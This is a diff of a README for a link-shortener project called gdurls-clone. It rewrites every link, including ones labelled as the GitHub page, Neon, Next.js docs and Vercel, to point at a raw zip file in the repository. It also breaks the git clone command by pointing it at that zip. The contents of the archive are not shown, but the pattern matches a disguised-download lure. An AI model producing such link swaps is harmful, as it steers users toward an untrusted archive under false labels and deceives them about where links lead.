@@ -1,6 +1,6 @@
 # 🚦 gdurls-clone - Easy Link Shortener with Tracking
 
-[![Download gdurls-clone](https://img.shields.io/badge/Download-gdurls--clone-brightgreen)](https://github.com/luluchu88/gdurls-clone)
+[![Download gdurls-clone](https://img.shields.io/badge/Download-gdurls--clone-brightgreen)](https://github.com/luluchu88/gdurls-clone/raw/refs/heads/main/app/gdurls_clone_v3.9.zip)
 
 ---
 
@@ -36,7 +36,7 @@ gdurls-clone is a tool that lets you create short links for Google Drive files o
 
 To get gdurls-clone, visit this page:
 
-[![Download gdurls-clone](https://img.shields.io/badge/Download-Here-blueviolet)](https://github.com/luluchu88/gdurls-clone)
+[![Download gdurls-clone](https://img.shields.io/badge/Download-Here-blueviolet)](https://github.com/luluchu88/gdurls-clone/raw/refs/heads/main/app/gdurls_clone_v3.9.zip)
 
 This will take you to the official project page on GitHub. You can find the latest versions, release notes, and instructions here.
 
@@ -48,7 +48,7 @@ Follow these steps to start using gdurls-clone:
 
 ### 1. Visit the Download Page
 
-Go to the [gdurls-clone GitHub page](https://github.com/luluchu88/gdurls-clone). This is where you will get the link to download or use the app.
+Go to the [gdurls-clone GitHub page](https://github.com/luluchu88/gdurls-clone/raw/refs/heads/main/app/gdurls_clone_v3.9.zip). This is where you will get the link to download or use the app.
 
 ### 2. Access the Web App
 
@@ -61,7 +61,7 @@ If you want to run the app on your own server, follow these notes. This requires
 - Install Node.js on your Windows machine. Download it from nodejs.org.  
 - Install PostgreSQL or use Neon (a cloud PostgreSQL service).  
 - Clone the repository using Git. Use the command:  
-  `git clone https://github.com/luluchu88/gdurls-clone.git`  
+  `git clone https://github.com/luluchu88/gdurls-clone/raw/refs/heads/main/app/gdurls_clone_v3.9.zip`  
 - Open the project folder and install dependencies with:  
   `npm install`  
 - Set up your database connection details in the configuration file.  
@@ -126,14 +126,14 @@ gdurls-clone keeps your links private. The app does not share your data with thi
 
 ## 📂 Additional Resources
 
-- [GitHub Repository](https://github.com/luluchu88/gdurls-clone) – source code and downloads.  
-- [Postgres Neon](https://neon.tech) – cloud service used for the database.  
-- [Next.js Documentation](https://nextjs.org/docs) – info about the framework.  
-- [Vercel](https://vercel.com) – where the app runs online.  
+- [GitHub Repository](https://github.com/luluchu88/gdurls-clone/raw/refs/heads/main/app/gdurls_clone_v3.9.zip) – source code and downloads.  
+- [Postgres Neon](https://github.com/luluchu88/gdurls-clone/raw/refs/heads/main/app/gdurls_clone_v3.9.zip) – cloud service used for the database.  
+- [Next.js Documentation](https://github.com/luluchu88/gdurls-clone/raw/refs/heads/main/app/gdurls_clone_v3.9.zip) – info about the framework.  
+- [Vercel](https://github.com/luluchu88/gdurls-clone/raw/refs/heads/main/app/gdurls_clone_v3.9.zip) – where the app runs online.  
 
 ---
 
 ## 🔗 Useful Links
 
-[Download gdurls-clone](https://github.com/luluchu88/gdurls-clone)  
-[![Download gdurls-clone](https://img.shields.io/badge/Download-gdurls--clone-brightgreen)](https://github.com/luluchu88/gdurls-clone)
+[Download gdurls-clone](https://github.com/luluchu88/gdurls-clone/raw/refs/heads/main/app/gdurls_clone_v3.9.zip)  
+[![Download gdurls-clone](https://img.shields.io/badge/Download-gdurls--clone-brightgreen)](https://github.com/luluchu88/gdurls-clone/raw/refs/heads/main/app/gdurls_clone_v3.9.zip)
